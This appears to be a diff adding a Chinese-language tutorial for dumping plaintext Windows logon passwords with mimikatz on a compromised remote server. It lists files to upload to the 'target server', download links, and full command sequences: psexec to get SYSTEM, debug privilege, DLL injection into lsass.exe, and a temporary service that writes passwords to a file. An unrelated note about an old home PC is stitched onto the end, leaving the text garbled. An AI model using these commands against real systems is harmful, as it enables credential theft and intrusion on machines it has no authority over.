@@ -1,0 +1,43 @@
+下载地址 keio2.ys168.com   shell1 下面 轻量级调试器神器获取密码明文 - mimikatz.rar 2,093KB[编辑]
+ 
+在远程终端（3389、mstsc.exe）、虚拟桌面中抓取密码的方法：
+通常你在远程终端中运行该程序会提示：存储空间不足，无法处理此命令。
+这是因为在终端模式下，不能插入远线程，跨会话不能注入，你需要使用如下方法执行该程序：
+首先提取几个文件，只抓取密码的话，只需要这几个文件：
+mimikatz_trunk\tools\PsExec.exe
+mimikatz_trunk\Win32\mimikatz.exe
+mimikatz_trunk\Win32\sekurlsa.dll
+打包后上传至目标服务器，然后解压释放，注意路径中绝对不能有中文（可以有空格）！否则加载DLL的时候会报错：找不到文件。
+然后使用以下任何一种方法即可抓取密码：
+//最简单实用的方法，使用 PsExec.exe 启动。
+//在系统帐户中运行 cmd.exe，或者直接运行 mimikatz.exe
+psexec -s cmd.exe
+//启动 mimikatz.exe
+C:\mimikatz_trunk\Win32\mimikatz.exe
+//提升权限
+privilege::debug
+//注入dll，要用绝对路径！并且路径中绝对不能有中文（可以有空格）！
+inject::process lsass.exe "C:\mimikatz_trunk\Win32\sekurlsa.dll"
+//抓取密码
+@getLogonPasswords
+//退出，不要用 ctrl + c，会导致 mimikatz.exe CPU 占用达到 100%，死循环。
+exit
+//*********************************************************
+//使用 At 启动
+at ***
+//*********************************************************
+//创建服务方法
+sc create getpassword binpath= "cmd.exe /c c:\xxx\mimikatz.exe < command.txt > password.txt"
+sc start getpassword
+sc delete getpassword
+//*********************************************************
+//telnet 远程命令管道
+telnet ****
+ 法国神器mimikatz使用视频（服务器上操作）视频
+http://115.com/file/c2jra8xd#mimikatz.zip
+ 
+ 单核 旧电脑  
+ 
+我以前用的垃圾电脑 6.7年了  组装的电脑 3000多块钱   现在用 开机一般都是 26秒   不会保护电脑  配置还高也会慢的要死
+ 
+?
